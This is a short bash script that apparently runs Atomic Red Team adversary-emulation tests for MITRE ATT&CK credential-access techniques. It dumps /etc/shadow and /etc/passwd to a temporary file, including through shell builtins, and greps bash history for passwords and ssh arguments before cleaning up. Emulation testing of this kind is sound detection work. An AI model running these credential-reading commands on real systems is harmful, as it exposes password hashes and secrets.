#!/bin/bash
set -euxo pipefail

function header () {
  echo "===== $1 ====="
}

INFO=/var/log/lab-x-test-info.log
DEBUG=/var/log/lab-x-test-debug.log

# Create Log Files
printf '' > $INFO > $DEBUG

# Tail the info logfile as a background process so the contents of the
# info logfile are output to stdout.
tail -f $INFO &

# Set an EXIT trap to ensure your background process is
# cleaned-up when the script exits
trap "pkill -P $$" EXIT

# Redirect both stdout and stderr to write to the debug logfile
exec 1>>$DEBUG 2>>$DEBUG

# Tests

# MITRE Reference https://attack.mitre.org/techniques/T1003/008/
# Tests from https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.008/T1003.008.md
header "T1003.008 - /etc/passwd and /etc/shadow" | tee -a $INFO
output_file=/tmp/T1003.008.txt

header "Test #1 - Access /etc/shadow (Local)" | tee -a $INFO
sudo cat /etc/shadow > $output_file
cat $output_file

header "Test #2 - Access /etc/passwd (Local)" | tee -a $INFO
cat /etc/passwd > $output_file
cat $output_file

header "Test #3 - Access /etc/{shadow,passwd} with a standard bin that's not cat" | tee -a $INFO
#sudo echo -e $(e /etc/passwd;p;e /etc/shadow;p) > $output_file

header "Test #4 - Access /etc/{shadow,passwd} with shell builtins" | tee -a $INFO
function testcat(){ echo "$(< $1)"; }
testcat /etc/passwd > $output_file
testcat /etc/shadow > $output_file

header "Cleanup of $output_file" | tee -a $INFO
sudo rm -f $output_file


# MITRE Reference https://attack.mitre.org/techniques/T1552/003
# Tests from https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.003/T1552.003.md
header "T1552.003 - Bash History" | tee -a $INFO
output_file=/tmp/T1552.003.txt

header "Test #1 - Search Through Bash History" | tee -a $INFO
(history | grep -e '-p ' -e 'pass' -e 'ssh') > $output_file
cat $output_file

header "Cleanup of $output_file" | tee -a $INFO
sudo rm -f $output_file
